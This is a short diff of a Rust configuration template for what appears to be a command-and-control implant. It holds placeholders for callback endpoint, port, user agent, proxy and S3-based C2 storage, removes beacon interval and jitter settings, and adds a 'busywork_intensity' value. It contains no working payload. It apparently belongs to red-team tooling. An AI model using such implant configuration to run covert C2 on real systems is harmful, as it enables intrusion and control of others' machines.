@@ -8,11 +8,11 @@ pub static post_uri: &str = "%ENDPOINT%";
 pub static callback_port: &str = "%PORT%";
 pub static user_agent: &str = "%USERAGENT%";
 pub static proxy_host: &str = "%PROXYURL%";
-pub static callback_interval: u64 = %SLEEPTIME%;
-pub static callback_jitter: u64 = %JITTER%;
 pub static chunk_size: usize = %CHUNKSIZE%;
 pub static use_ssl : bool = false; // TODO: %SSL%
 pub static use_proxy: bool = false; // TODO: %PROXYENABLED%
+
+pub static busywork_intensity: &str = "%BUSYWORK_INTENSITY%";
 
 // S3 Storage C2 configuration (stamped at build time)
 pub static use_s3: bool = %USE_S3%;
